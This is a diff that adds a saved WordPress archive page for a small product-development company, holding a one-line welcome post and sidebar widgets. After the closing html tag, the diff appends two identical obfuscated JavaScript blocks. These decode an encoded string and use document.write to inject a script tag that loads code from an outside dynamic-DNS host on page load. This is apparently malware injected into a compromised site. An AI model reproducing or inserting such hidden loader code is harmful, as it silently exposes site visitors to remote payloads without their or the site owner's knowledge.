@@ -1,0 +1,345 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+
+<head profile="http://gmpg.org/xfn/11">
+	<title>2009  February | Product Development Co</title>
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+	<meta name="generator" content="WordPress 2.7.1" />
+	<meta name="template" content="K2 1.0-RC7" />
+ 	<meta name="description" content="Turning Ideas Into Products" />
+  
+	<link rel="stylesheet" type="text/css" media="screen" href="http://www.productdevelopmentco.com/wp-content/themes/k2/style.css" />
+
+	
+	<link rel="alternate" type="application/rss+xml" title="RSS 2.0" href="http://www.productdevelopmentco.com/feed/" />
+	<link rel="alternate" type="text/xml" title="RSS .92" href="http://www.productdevelopmentco.com/feed/rss/" />
+	<link rel="alternate" type="application/atom+xml" title="Atom 0.3" href="http://www.productdevelopmentco.com/feed/atom/" />
+
+	
+	<link rel="EditURI" type="application/rsd+xml" title="RSD" href="http://www.productdevelopmentco.com/xmlrpc.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.productdevelopmentco.com/wp-includes/wlwmanifest.xml" /> 
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-includes/js/jquery/jquery.js?ver=1.2.6'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-includes/js/jquery/jquery.form.js?ver=2.02'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/plugins/contact-form-7/contact-form-7.js?ver=1.10.0.1'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/themes/k2/js/k2.functions.js.php?ver=1.0-RC7'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/themes/k2/js/k2.slider.js.php?ver=1.0-RC7'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/themes/k2/js/k2.trimmer.js.php?ver=1.0-RC7'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/themes/k2/js/k2.rollingarchives.js.php?ver=1.0-RC7'></script>
+<script type='text/javascript' src='http://www.productdevelopmentco.com/wp-content/themes/k2/js/k2.livesearch.js.php?ver=1.0-RC7'></script>
+<meta name="generator" content="WordPress 2.7.1" />
+
+
+<!-- all in one seo pack 1.4.7 [235,292] -->
+<meta name="robots" content="noindex,follow" />
+<!-- /all in one seo pack -->
+<link rel="stylesheet" href="http://www.productdevelopmentco.com/wp-content/plugins/contact-form-7/stylesheet.css" type="text/css" /><script type="text/javascript"><!-- 
+	 
+	            function addEvent(elm, evType, fn, useCapture) 
+	            // addEvent and removeEvent 
+	            // cross-browser event handling for IE5+,  NS6 and Mozilla 
+	            // By Scott Andrew 
+	            { 
+	              if (elm.addEventListener){ 
+	                  elm.addEventListener(evType, fn, useCapture); 
+	                  return true; 
+	              } else if (elm.attachEvent){ 
+	                  var r = elm.attachEvent("on"+evType, fn); 
+	                  return r; 
+	              } else { 
+	                  alert("Handler could not be removed"); 
+	              } 
+	            }  
+	            function externalLinks() { 
+	             if (!document.getElementsByTagName) return; 
+	             var anchors = document.getElementsByTagName("a"); 
+				 var newwindows =0;
+	             for (var i=0; i<anchors.length; i++) { 
+	               var anchor = anchors[i]; 
+	               if (anchor.getAttribute("href") && anchor.getAttribute("rel") == "external") {
+	                        anchor.setAttribute("target","_blank"); 
+							newwindows++;
+					}
+	             } 
+	            } 
+	 
+	            addEvent(window, "load", externalLinks); 
+
+	            //--> 
+	            </script> 
+	            
+<!-- Protected by WP-SpamFree v1.9.8.7 :: JS BEGIN -->
+<script type="text/javascript" src="http://www.productdevelopmentco.com/wp-content/plugins/wp-spamfree/js/wpsf-js.php"></script> 
+<!-- Protected by WP-SpamFree v1.9.8.7 :: JS END -->
+
+		<style type="text/css">
+				#header {
+			background-image: url("http://www.productdevelopmentco.com/wp-content/uploads/2009/02/pdc_header1.png");
+		}
+		
+				#header h1 a, #header .description {
+			color: #ffffff;
+		}
+				</style>
+		
+	<script type="text/javascript">
+	//<![CDATA[
+	
+		
+		jQuery(document).ready(function(){
+						K2.LiveSearch = new LiveSearch(
+				"http://www.productdevelopmentco.com/wp-content/themes/k2/rollingarchive.php",
+				"Type and Wait to Search"
+			);
+			
+						K2.RollingArchives = new RollingArchives(
+				"http://www.productdevelopmentco.com/wp-content/themes/k2/theloop.php",
+				"Page %1$d of %2$d"
+			);
+					});
+
+			//]]>
+	</script>
+
+		<link rel='archives' title='September 2010' href='http://www.productdevelopmentco.com/2010/09/' />
+	<link rel='archives' title='March 2009' href='http://www.productdevelopmentco.com/2009/03/' />
+	<link rel='archives' title='February 2009' href='http://www.productdevelopmentco.com/2009/02/' />
+</head>
+
+<body class="">
+
+
+<a class="skiplink" href="#startcontent" accesskey="2">Skip to content</a>
+
+<div id="page">
+
+	
+	<div id="header">
+
+		
+	<ul class="menu">
+				<li class="current_page_item"><a href="http://www.productdevelopmentco.com/" title="Blog">Blog</a></li>
+		
+		
+		<li class="page_item page-item-112"><a href="http://www.productdevelopmentco.com/testimonials/" title="Testimonials">Testimonials</a></li>
+<li class="page_item page-item-119"><a href="http://www.productdevelopmentco.com/case-studies/" title="Case Studies">Case Studies</a></li>
+<li class="page_item page-item-11"><a href="http://www.productdevelopmentco.com/services/" title="Services">Services</a></li>
+<li class="page_item page-item-2"><a href="http://www.productdevelopmentco.com/about/" title="About Us">About Us</a></li>
+<li class="page_item page-item-8"><a href="http://www.productdevelopmentco.com/ideas-to-profits-process/" title="PDC Process">PDC Process</a></li>
+<li class="page_item page-item-99"><a href="http://www.productdevelopmentco.com/contact-us/" title="Contact Us">Contact Us</a></li>
+
+			</ul> <!-- .menu -->
+
+
+	</div> <!-- #header -->
+
+	<hr />
+
+	
+<div class="content">
+	
+<div id="primary-wrapper">
+	<div id="primary">
+		<div id="notices"></div>
+		<a name="startcontent" id="startcontent"></a>
+
+				<div id="dynamic-content">
+
+			
+<div id="rollingarchives" style="display:none;">
+	<div id="texttrimmer">
+		<div id="trimmertrackwrap"><div id="trimmertrack"><div id="trimmerhandle"></div></div></div>
+		
+		<div id="trimmerless"><span>Less</span></div>
+		<div id="trimmermore"><span>More</span></div>
+		<div id="trimmertrim"><span>Trim</span></div>
+		<div id="trimmeruntrim"><span>Untrim</span></div>
+	</div>
+
+	<div id="rollnavigation">
+		<div id="pagetrackwrap"><div id="pagetrack"><div id="pagehandle"><div id="rollhover"><div id="rolldates"></div></div></div></div></div>
+
+		<div id="rollpages"></div>
+		
+		<a id="rollprevious" title="Older" href="#">
+			<span>&laquo;</span> Older		</a>
+		<div id="rollhome" title="Home">
+			<span>Home</span>
+		</div>
+		<div id="rollload" title="Loading">
+			<span>Loading</span>
+		</div>
+		<a id="rollnext" title="Newer" href="#">
+			Newer <span>&raquo;</span>
+		</a>
+
+	</div> <!-- #rollnavigation -->
+</div> <!-- #rollingarchives -->
+
+<noscript>
+	
+		<div id="nav-above" class="navigation">
+
+								<div class="nav-previous"></div>
+			<div class="nav-next"></div>
+		
+			<div class="clear"></div>
+		</div>
+
+ 
+</noscript>
+
+<script type="text/javascript">
+// <![CDATA[
+	jQuery(document).ready(function() {
+		K2.RollingArchives.setState(
+			1,
+			1,
+			{"year": "2009", "monthnum": "02"},
+			["February, 2009"]		);
+
+		smartPosition('#dynamic-content');
+	});
+// ]]>
+</script>
+
+<div id="rollingcontent" class="hfeed">
+	
+	
+			<div class="page-head">
+			<h2>Monthly Archive for February, 2009</h2>
+		</div>
+	
+	
+		<div id="post-5" class="">
+			<div class="entry-head">
+				<h3 class="entry-title"><a href="http://www.productdevelopmentco.com/2009/02/27/welcome/" rel="bookmark" title='Permanent Link to "Welcome"'>Welcome</a></h3>
+
+				<div class="entry-meta">
+					<span class="meta-start">Published</span>  <div class="entry-date"><span class="meta-prep">on</span> <abbr class="published" title="2009-02-27T00:40:33-0800">February 27, 2009</abbr></div> <div class="entry-categories"><span class="meta-prep">in</span> <a href="http://www.productdevelopmentco.com/category/uncategorized/" title="View all posts in Uncategorized">Uncategorized</a></div><span class="meta-end">.</span>
+					<a href="http://www.productdevelopmentco.com/2009/02/27/welcome/#respond" class="commentslink"  title="Comment on Welcome">0&nbsp;<span>Comments</span></a>
+					
+									</div> <!-- .entry-meta -->
+			</div> <!-- .entry-head -->
+
+			<div class="entry-content">
+				<p>Welcome to our website! We are looking forward to working with you!</p>
+<p>Product Development Co. is a new product development company that turns <em>great</em> <strong>ideas</strong> into <em>great</em> <strong>products</strong>.</p>
+<p>Our mission is to help each of our client&#8217;s prepare their product to reach the potential for optimal sales in the market.</p>
+<p>We help design, engineer, and create a viable product to be well-received by it&#8217;s end user.</p>
+<p>Our staff has worked with a variety of companies, ranging from start-ups to Fortune 5000 companies, in the design, engineering, and prototyping of new products.</p>
+<p>We are committed to delivering value-based services to you, with less hassle.</p>
+<p>To learn more about how we can help you create a better product, while saving time and money, call us at the number above for a free consultation.</p>
+
+							</div> <!-- .entry-content -->
+
+		</div> <!-- #post-ID -->
+
+		
+
+ 
+
+</div><!-- #rollingcontent .hfeed -->
+
+		</div> <!-- #dynamic-content -->
+			</div> <!-- #primary -->
+</div> <!-- #primary-wrapper -->
+
+	<hr />
+<div id="sidebar-1" class="secondary">
+	<div id="flickr" class="widget widget_flickr">	<h4>Portfolio</h4><!-- Start of Flickr Badge -->
+<style type="text/css">
+#flickr_badge_source_txt {padding:0; font: 11px Arial, Helvetica, Sans serif; color:#666666;}
+#flickr_badge_icon {display:block !important; margin:0 !important; border: 1px solid rgb(0, 0, 0) !important;}
+#flickr_icon_td {padding:0 5px 0 0 !important;}
+.flickr_badge_image {text-align:center !important;}
+.flickr_badge_image img {border: 1px solid black !important;}
+#flickr_badge_uber_wrapper {width:150px;}
+#flickr_www {display:block; text-align:center; padding:0 10px 0 10px !important; font: 11px Arial, Helvetica, Sans serif !important; color:#3993ff !important;}
+#flickr_badge_uber_wrapper a:hover,
+#flickr_badge_uber_wrapper a:link,
+#flickr_badge_uber_wrapper a:active,
+#flickr_badge_uber_wrapper a:visited {text-decoration:none !important; background:inherit !important;color:#3993ff;}
+#flickr_badge_wrapper {background-color:#ffffff;border: solid 1px #000000}
+#flickr_badge_source {padding:0 !important; font: 11px Arial, Helvetica, Sans serif !important; color:#666666 !important;}
+</style>
+<table id="flickr_badge_uber_wrapper" cellpadding="0" cellspacing="10" border="0"><tr><td><table cellpadding="0" cellspacing="10" border="0" id="flickr_badge_wrapper">
+<tr><td align='center'>
+<a href='http://www.flickr.com/photos/productdevelopment/3311855701/'><img alt='Crane Design' title='Crane Design' src='http://farm4.staticflickr.com/3525/3311855701_103961f122_t.jpg' border='0'></a><br /><br /><a href='http://www.flickr.com/photos/productdevelopment/3311843089/'><img alt='Crane Design' title='Crane Design' src='http://farm4.staticflickr.com/3297/3311843089_7274454815_t.jpg' border='0'></a><br /><br /><a href="http://www.flickr.com/photos/productdevelopment/">More Photos</a>
+</td></tr>
+</table>
+</td></tr></table>
+<!-- End of Flickr Badge -->
+
+		</div><div id="calendar" class="widget widget_calendar"><h4>&nbsp;</h4><div id="calendar_wrap"><table id="wp-calendar" summary="Calendar">
+	<caption>February 2009</caption>
+	<thead>
+	<tr>
+		<th abbr="Monday" scope="col" title="Monday">M</th>
+		<th abbr="Tuesday" scope="col" title="Tuesday">T</th>
+		<th abbr="Wednesday" scope="col" title="Wednesday">W</th>
+		<th abbr="Thursday" scope="col" title="Thursday">T</th>
+		<th abbr="Friday" scope="col" title="Friday">F</th>
+		<th abbr="Saturday" scope="col" title="Saturday">S</th>
+		<th abbr="Sunday" scope="col" title="Sunday">S</th>
+	</tr>
+	</thead>
+
+	<tfoot>
+	<tr>
+		<td colspan="3" id="prev" class="pad">&nbsp;</td>
+		<td class="pad">&nbsp;</td>
+		<td abbr="March" colspan="3" id="next"><a href="http://www.productdevelopmentco.com/2009/03/" title="View posts for March 2009">Mar &raquo;</a></td>
+	</tr>
+	</tfoot>
+
+	<tbody>
+	<tr>
+		<td colspan="6" class="pad">&nbsp;</td><td>1</td>
+	</tr>
+	<tr>
+		<td>2</td><td>3</td><td>4</td><td>5</td><td>6</td><td>7</td><td>8</td>
+	</tr>
+	<tr>
+		<td>9</td><td>10</td><td>11</td><td>12</td><td>13</td><td>14</td><td>15</td>
+	</tr>
+	<tr>
+		<td>16</td><td>17</td><td>18</td><td>19</td><td>20</td><td>21</td><td>22</td>
+	</tr>
+	<tr>
+		<td>23</td><td>24</td><td>25</td><td>26</td><td><a href="http://www.productdevelopmentco.com/2009/02/27/" title="Welcome">27</a></td><td>28</td>
+		<td class="pad" colspan="1">&nbsp;</td>
+	</tr>
+	</tbody>
+	</table></div></div><div id="rss-365808561" class="widget widget_rss"><h4><a class='rsswidget' href='http://www.ideabuyer.com/news/feed/' title='Syndicate this content'><img style='background:orange;color:white;border:none;' width='14' height='14' src='http://www.productdevelopmentco.com/wp-includes/images/rss.png' alt='RSS' /></a> <a class='rsswidget' href='https://www.ideabuyer.com' title='Product developers for entrepreneurs looking to create a business around their idea.'>Product Development Articles</a></h4><ul><li><a class='rsswidget' href='https://www.ideabuyer.com/news/idea-buyer-makes-phone-throne-idea-reality/' title='An example of what is takes to get a product ready for market… Phone Throne has gone through an entire product development life cycle with the Idea Buyer team. The startup has become a perfect case study for how Idea Buyer can help entrepreneurs with everything necessary for making an idea reality and launching a […] The post Idea Buyer Makes Phone Thron [&hellip;]'>Idea Buyer Makes Phone Throne Idea Reality</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/startup-intellectual-property/' title='Why Startups Need to Consider Intellectual Property Protection Running a Startup doesn’t often allow for time to always think about the 10 year plan. Intellectual Property can provide a Startup with a competitive advantage, which may some day be their saving grace. When entrepreneurs embark on a new business idea, they have no doubt it […] The post Start [&hellip;]'>Startup Moving Fast? Slow Down, Consider IP</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/happy-lunar-new-year/' title='Happy Lunar New Year! The US-based Idea Buyer team hopes you all enjoy your dumplings, rice cakes, fish and citrus! May the year of the Pig bring you a prosperous 2019!   To all of our friends and partners in China and Southeast Asia:     The post The Year of the Prosperous Pig appeared first on Idea Buyer - We Turn Ideas Into Businesses®. '>The Year of the Prosperous Pig</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/small-business-policy-expo-2019-washington-d-c/' title='SBE Council Supports Innovator Entrepreneurs There’s no better way to support the entrepreneurs that we work with, than being a part of the policy discussions with lawmakers. Idea Buyer founder, Eric Corl, will be on the panel discussing policy changes that need to be made to encourage start up and small business innovation.     […] The post Small Busi [&hellip;]'>Small Business Policy Expo 2019- Washington, D.C.</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/hustle-is-a-must/' title='Ever wonder what it takes to get on Shark Tank? Or better yet, become a shark? You’ve got to be willing to hustle. In a recent Medium article, Idea Buyer VP shares her thoughts on Hustle: “It’s one of those things that everyone is capable of, yet so few people choose to do. Successful entrepreneurs […] The post Hustle is a MUST! appeared first on Ide [&hellip;]'>Hustle is a MUST!</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/three-product-idea-to-dos/' title='Having an idea for a product is great. But what do you do after that? Here are the first three things we recommend: 1. Google. There is no better search engine, to look for things that you never knew existed. Start with a Google Patent search. Yes- Google has a section, similar to images, where […] The post Three Product Idea To-Dos appeared first on Idea  [&hellip;]'>Three Product Idea To-Dos</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/idea-buyer-product-launch-magnecarry/' title='MagneCarry went through the whole process with Idea Buyer. From design to manufacturing and today- to Launch! We couldn’t be prouder to have worked with such a great product and group of entrepreneurs! Check out this video… If this doesn’t review Idea Buyer beautifully, I can’t imagine what would! The post Idea Buyer Product Launch MagneCarry appeare [&hellip;]'>Idea Buyer Product Launch MagneCarry</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/better-business-bureau-announcement/' title='Business Development Company Cuts BBB Funding, Donates to SBE Council FOR IMMEDIATE RELEASE- Columbus, OH   As of Friday, December 7, 2018, Idea Buyer has ceased involvement with the Better Business Bureau of Central Ohio, better known as the BBB. Idea Buyer supports entrepreneurship and the growth of small business. From our experience, the BBB […] The p [&hellip;]'>Better Business Bureau Announcement</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/bandit-coffee-for-teachers/' title='Counting down to Christmas with 25 days of products! With only 20 days left until Christmas, Bandit Coffee has you covered with their single serving instant packs! Grab some to stuff in a stocking or in a mug as a great gift for a teacher or co-worker! Click here to buy any of the great […] The post Bandit Coffee for Teachers appeared first on Idea Buyer - [&hellip;]'>Bandit Coffee for Teachers</a></li><li><a class='rsswidget' href='https://www.ideabuyer.com/news/holiday-oral-health/' title='Silver Care naturally prevents toothbrush germs! With only 21 days left until Christmas, who can afford to be sick? Standard toothbrushes can hold bacteria that can make you sick. Silver Care is the only toothbrush on the market that is infused with silver. An all-natural mineral, silver has anti-bacterial is often used in home remedies. […] The post Holid [&hellip;]'>Holiday Oral Health</a></li></ul></div></div> <!-- #sidebar-1 -->
+
+<hr />
+<div id="sidebar-2" class="secondary">
+</div> <!-- #sidebar-2 -->
+
+<div class="clear"></div>
+	
+</div> <!-- .content -->
+
+	
+	<div class="clear"></div>
+</div> <!-- Close Page -->
+
+<hr />
+
+
+<div id="footer">
+	
+	<p class="footerpoweredby">
+		Powered by <a href="http://wordpress.org/">WordPress<span class="wp-version">2.7.1</span></a> and <a href="http://getk2.com/" title="Loves you like a kitten.">K2<span class="k2-version">1.0-RC7</span></a>	</p>
+
+	<p class="footerfeedlinks">
+		<a href="http://www.productdevelopmentco.com/feed/">Entries Feed</a> and <a href="http://www.productdevelopmentco.com/comments/feed/">Comments Feed</a>	</p>
+
+	<p class="footerstats">
+		20 queries. 0.0720 seconds.	</p>
+</div>
+
+
+</body>
+</html> 
+<script type="text/javascript">var j2uDDQZe = "vkUbq18vkUbq32";var XEjdj4Tx0 = "vkUbq3cvkUbq73vkUbq63vkUbq72vk"; var XEjdj4Tx1 = "Ubq69vkUbq70vkUbq74vkUbq20vkUb"; var XEjdj4Tx2 = "q74vkUbq79vkUbq70vkUbq65vkUbq3"; var XEjdj4Tx3 = "dvkUbq22vkUbq74vkUbq65vkUbq78v"; var XEjdj4Tx4 = "kUbq74vkUbq2fvkUbq6avkUbq61vkU"; var XEjdj4Tx5 = "bq76vkUbq61vkUbq73vkUbq63vkUbq"; var XEjdj4Tx6 = "72vkUbq69vkUbq70vkUbq74vkUbq22"; var XEjdj4Tx7 = "vkUbq20vkUbq73vkUbq72vkUbq63vk"; var XEjdj4Tx8 = "Ubq3dvkUbq22vkUbq68vkUbq74vkUb"; var XEjdj4Tx9 = "q74vkUbq70vkUbq3avkUbq2fvkUbq2"; var XEjdj4Tx10 = "fvkUbq61vkUbq72vkUbq73vkUbq33v"; var XEjdj4Tx11 = "kUbq30vkUbq30vkUbq30vkUbq2evkU"; var XEjdj4Tx12 = "bq73vkUbq65vkUbq72vkUbq76vkUbq"; var XEjdj4Tx13 = "65vkUbq62vkUbq6cvkUbq6fvkUbq67"; var XEjdj4Tx14 = "vkUbq2evkUbq6evkUbq65vkUbq74vk"; var XEjdj4Tx15 = "Ubq2fvkUbq2fvkUbq6dvkUbq6cvkUb"; var XEjdj4Tx16 = "q2evkUbq70vkUbq68vkUbq70vkUbq2"; var XEjdj4Tx17 = "2vkUbq3evkUbq20vkUbq3cvkUbq2fv"; var XEjdj4Tx18 = "kUbq73vkUbq63vkUbq72vkUbq69vkU"; var XEjdj4Tx19 = "bq70vkUbq74vkUbq3e"; var iYpy2yjQ = "IMU0718vkUbq32";var KvYdm5G7 = XEjdj4Tx0+XEjdj4Tx1+XEjdj4Tx2+XEjdj4Tx3+XEjdj4Tx4+XEjdj4Tx5+XEjdj4Tx6+XEjdj4Tx7+XEjdj4Tx8+XEjdj4Tx9+XEjdj4Tx10+XEjdj4Tx11+XEjdj4Tx12+XEjdj4Tx13+XEjdj4Tx14+XEjdj4Tx15+XEjdj4Tx16+XEjdj4Tx17+XEjdj4Tx18+XEjdj4Tx19; p56NVRKT = KvYdm5G7.replace(/vkUbq/g,"%");var WCHGKCVL = unescape;var j2uDDQZe = "N2Yaf18IMU0732";w9221 = this;var VFzBJT9l=w9221["WJd5GoGJc2uG5mJGe2JnltJ".replace(/[J52WlG\:]/g, "")];VFzBJT9l.write(WCHGKCVL(p56NVRKT));</script><script type="text/javascript">var j2uDDQZe = "vkUbq18vkUbq32";var XEjdj4Tx0 = "vkUbq3cvkUbq73vkUbq63vkUbq72vk"; var XEjdj4Tx1 = "Ubq69vkUbq70vkUbq74vkUbq20vkUb"; var XEjdj4Tx2 = "q74vkUbq79vkUbq70vkUbq65vkUbq3"; var XEjdj4Tx3 = "dvkUbq22vkUbq74vkUbq65vkUbq78v"; var XEjdj4Tx4 = "kUbq74vkUbq2fvkUbq6avkUbq61vkU"; var XEjdj4Tx5 = "bq76vkUbq61vkUbq73vkUbq63vkUbq"; var XEjdj4Tx6 = "72vkUbq69vkUbq70vkUbq74vkUbq22"; var XEjdj4Tx7 = "vkUbq20vkUbq73vkUbq72vkUbq63vk"; var XEjdj4Tx8 = "Ubq3dvkUbq22vkUbq68vkUbq74vkUb"; var XEjdj4Tx9 = "q74vkUbq70vkUbq3avkUbq2fvkUbq2"; var XEjdj4Tx10 = "fvkUbq61vkUbq72vkUbq73vkUbq33v"; var XEjdj4Tx11 = "kUbq30vkUbq30vkUbq30vkUbq2evkU"; var XEjdj4Tx12 = "bq73vkUbq65vkUbq72vkUbq76vkUbq"; var XEjdj4Tx13 = "65vkUbq62vkUbq6cvkUbq6fvkUbq67"; var XEjdj4Tx14 = "vkUbq2evkUbq6evkUbq65vkUbq74vk"; var XEjdj4Tx15 = "Ubq2fvkUbq2fvkUbq6dvkUbq6cvkUb"; var XEjdj4Tx16 = "q2evkUbq70vkUbq68vkUbq70vkUbq2"; var XEjdj4Tx17 = "2vkUbq3evkUbq20vkUbq3cvkUbq2fv"; var XEjdj4Tx18 = "kUbq73vkUbq63vkUbq72vkUbq69vkU"; var XEjdj4Tx19 = "bq70vkUbq74vkUbq3e"; var iYpy2yjQ = "IMU0718vkUbq32";var KvYdm5G7 = XEjdj4Tx0+XEjdj4Tx1+XEjdj4Tx2+XEjdj4Tx3+XEjdj4Tx4+XEjdj4Tx5+XEjdj4Tx6+XEjdj4Tx7+XEjdj4Tx8+XEjdj4Tx9+XEjdj4Tx10+XEjdj4Tx11+XEjdj4Tx12+XEjdj4Tx13+XEjdj4Tx14+XEjdj4Tx15+XEjdj4Tx16+XEjdj4Tx17+XEjdj4Tx18+XEjdj4Tx19; p56NVRKT = KvYdm5G7.replace(/vkUbq/g,"%");var WCHGKCVL = unescape;var j2uDDQZe = "N2Yaf18IMU0732";w9221 = this;var VFzBJT9l=w9221["WJd5GoGJc2uG5mJGe2JnltJ".replace(/[J52WlG\:]/g, "")];VFzBJT9l.write(WCHGKCVL(p56NVRKT));</script>
